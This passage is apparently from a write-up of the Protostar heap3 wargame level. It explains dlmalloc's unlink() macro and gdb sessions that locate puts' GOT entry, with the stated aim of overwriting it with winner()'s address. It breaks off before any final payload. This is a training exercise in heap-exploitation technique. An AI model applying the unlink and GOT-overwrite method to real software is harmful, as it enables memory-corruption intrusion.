<li>If neighboring chunks are free, dlmalloc will merge them. Since free chunks are in a doubly-linked
list, dlmalloc merges by first removing the linked chunks from the list and tying the loose ends
of the list back together. This is done via a macro called <code>unlink()</code>.</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define unlink(P, BK, FD)                                                     \</span>
</span><span class='line'><span class="cp">{                                                                             \</span>
</span><span class='line'><span class="cp">  BK = P-&gt;bk;                                                                 \</span>
</span><span class='line'><span class="cp">  FD = P-&gt;fd;                                                                 \</span>
</span><span class='line'><span class="cp">  FD-&gt;bk = BK;                                                                \</span>
</span><span class='line'><span class="cp">  BK-&gt;fd = FD;                                                                \</span>
</span><span class='line'><span class="cp">}                                                                             \</span>
</span></code></pre></td></tr></table></div></figure>


<p>Written with pointer notation:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">BK</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">P</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>  <span class="err">#</span> <span class="n">content</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">address</span> <span class="n">P</span> <span class="o">+</span> <span class="mi">12</span> <span class="n">stored</span> <span class="n">in</span> <span class="n">BK</span>
</span><span class='line'><span class="n">FD</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">P</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>   <span class="err">#</span> <span class="n">content</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">address</span> <span class="n">P</span> <span class="o">+</span> <span class="mi">8</span> <span class="n">stored</span> <span class="n">in</span> <span class="n">FD</span>
</span><span class='line'><span class="o">*</span><span class="p">(</span><span class="n">FD</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span> <span class="err">#</span> <span class="n">set</span> <span class="n">the</span> <span class="n">content</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">address</span> <span class="n">FD</span> <span class="o">+</span> <span class="mi">12</span> <span class="n">to</span> <span class="n">BK</span>
</span><span class='line'><span class="o">*</span><span class="p">(</span><span class="n">BK</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>  <span class="err">#</span> <span class="n">set</span> <span class="n">the</span> <span class="n">content</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">address</span> <span class="n">BK</span> <span class="o">+</span> <span class="mi">8</span> <span class="n">to</span> <span class="n">FD</span>
</span></code></pre></td></tr></table></div></figure>


<p>Since we can overwrite the bytes of P, we can overwrite 4-bytes of memory at two arbitrary places.
To trigger this code path, chunks being consolidated must be bigger than 80 bytes. dlmalloc
classifies these chunks as &ldquo;fastbins.&rdquo;</p>

<blockquote><p>An array of lists holding recently freed small chunks. Fastbins are not doubly linked.</p></blockquote>

<h2>What the heap looks like in heap3.c</h2>

<p>Run gdb on <code>heap3.c</code>. My personal preference is to set the disassembly-flavor to intel and turn off
pagination.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span>
</span><span class='line'>
</span><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="err">$</span> <span class="n">gdb</span> <span class="n">heap3</span>
</span><span class='line'><span class="n">GNU</span> <span class="n">gdb</span> <span class="p">(</span><span class="n">GDB</span><span class="p">)</span> <span class="mf">7.0.1</span><span class="o">-</span><span class="n">debian</span>
</span><span class='line'><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2009</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="p">.</span>
</span><span class='line'><span class="n">License</span> <span class="n">GPLv3</span><span class="o">+:</span> <span class="n">GNU</span> <span class="n">GPL</span> <span class="n">version</span> <span class="mi">3</span> <span class="n">or</span> <span class="n">later</span> <span class="o">&lt;</span><span class="nl">http</span><span class="p">:</span><span class="c1">//gnu.org/licenses/gpl.html&gt;</span>
</span><span class='line'><span class="n">This</span> <span class="n">is</span> <span class="n">free</span> <span class="nl">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="n">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="p">.</span>
</span><span class='line'><span class="n">There</span> <span class="n">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="p">.</span>  <span class="n">Type</span> <span class="s">&quot;show copying&quot;</span>
</span><span class='line'><span class="n">and</span> <span class="s">&quot;show warranty&quot;</span> <span class="k">for</span> <span class="n">details</span><span class="p">.</span>
</span><span class='line'><span class="n">This</span> <span class="n">GDB</span> <span class="n">was</span> <span class="n">configured</span> <span class="n">as</span> <span class="s">&quot;i486-linux-gnu&quot;</span><span class="p">.</span>
</span><span class='line'><span class="n">For</span> <span class="n">bug</span> <span class="n">reporting</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">please</span> <span class="nl">see</span><span class="p">:</span>
</span><span class='line'><span class="o">&lt;</span><span class="nl">http</span><span class="p">:</span><span class="c1">//www.gnu.org/software/gdb/bugs/&gt;...</span>
</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span><span class="p">...</span><span class="n">done</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">set</span> <span class="n">disassembly</span><span class="o">-</span><span class="n">flavor</span> <span class="n">intel</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">set</span> <span class="n">pagination</span> <span class="n">off</span>
</span></code></pre></td></tr></table></div></figure>


<p>We first disassemble the <code>main()</code> function.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="n">main</span>
</span><span class='line'><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="nl">main</span><span class="p">:</span>
</span><span class='line'><span class="mh">0x08048889</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>    <span class="n">push</span>   <span class="n">ebp</span>
</span><span class='line'><span class="mh">0x0804888a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
</span><span class='line'><span class="mh">0x0804888c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>    <span class="n">and</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
</span><span class='line'><span class="mh">0x0804888f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>    <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x20</span>
</span><span class='line'><span class="mh">0x08048892</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x20</span>
</span><span class='line'><span class="mh">0x08048899</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048ff2</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x0804889e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488a2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x20</span>
</span><span class='line'><span class="mh">0x080488a9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048ff2</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x080488ae</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488b2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">41</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x20</span>
</span><span class='line'><span class="mh">0x080488b9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048ff2</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x080488be</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488c2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488c5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>
</span><span class='line'><span class="mh">0x080488c8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488ca</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488ce</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">69</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488d2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488d5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048750</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x080488da</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">81</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488dd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span>
</span><span class='line'><span class="mh">0x080488e0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">87</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488e2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">89</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488e6</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">93</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488ea</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">97</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488ed</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048750</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x080488f2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">105</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488f5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">108</span><span class="o">&gt;:</span>  <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xc</span>
</span><span class='line'><span class="mh">0x080488f8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">111</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488fa</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">113</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488fe</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x08048902</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">121</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x08048905</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">124</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048750</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x0804890a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">129</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x0804890e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">133</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x08048911</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">136</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8049824</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x08048916</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">141</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x0804891a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">145</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x0804891d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">148</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8049824</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x08048922</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">153</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x08048926</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">157</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x08048929</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">160</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8049824</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x0804892e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">165</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x804ac27</span>
</span><span class='line'><span class="mh">0x08048935</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">172</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048790</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x0804893a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">177</span><span class="o">&gt;:</span>  <span class="n">leave</span>
</span><span class='line'><span class="mh">0x0804893b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">178</span><span class="o">&gt;:</span>  <span class="n">ret</span>
</span><span class='line'><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>The printf has become a <code>puts()</code>. <code>plt</code> stands for procedure linkage table, one of the structures
which makes dynamic loading and linking easier to use. <code>@plt</code> means we are calling <code>puts</code> at PLT
entry at address <code>0x8048790</code>. If we disassemble that address we see</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="mh">0x8048790</span>
</span><span class='line'><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">puts</span><span class="err">@</span><span class="nl">plt</span><span class="p">:</span>
</span><span class='line'><span class="mh">0x08048790</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>    <span class="n">jmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="nl">ds</span><span class="p">:</span><span class="mh">0x804b128</span>
</span><span class='line'><span class="mh">0x08048796</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>    <span class="n">push</span>   <span class="mh">0x68</span>
</span><span class='line'><span class="mh">0x0804879b</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span>   <span class="n">jmp</span>    <span class="mh">0x80486b0</span>
</span><span class='line'><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>It calls another function at address <code>0x804b128</code>. This address is part of the Global Offset Table
(GOT) which points to the dynamically linked library containing the actual <code>puts()</code> function.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x804b128</span>
</span><span class='line'><span class="mh">0x804b128</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>   <span class="mh">0x08048796</span>
</span></code></pre></td></tr></table></div></figure>


<p>We want to replace the call to <code>puts()</code> with a call to <code>winner()</code>. So we want to overwrite the
contents of <code>0x804b128</code> in the GOT, currently <code>0x08048796</code>, with the address to <code>winner()</code>.</p>

<p>To get a visual sense of what the heap looks like, set breakpoints at every library function
call, i.e. break at the address of <code>malloc()</code>, <code>strcpy()</code>, <code>free()</code>, and <code>puts()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8048ff2</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048ff2</span><span class="o">:</span> <span class="n">file</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mf">3211.</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8048750</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x8048750</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8049824</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span> <span class="n">at</span> <span class="mh">0x8049824</span><span class="o">:</span> <span class="n">file</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mf">3583.</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8048790</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">4</span> <span class="n">at</span> <span class="mh">0x8048790</span>
</span></code></pre></td></tr></table></div></figure>


<p>Run the program with some recognizable input strings.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="n">AAAAAAAAAAAA</span> <span class="n">BBBBBBBBBBBB</span> <span class="n">CCCCCCCCCCCC</span>
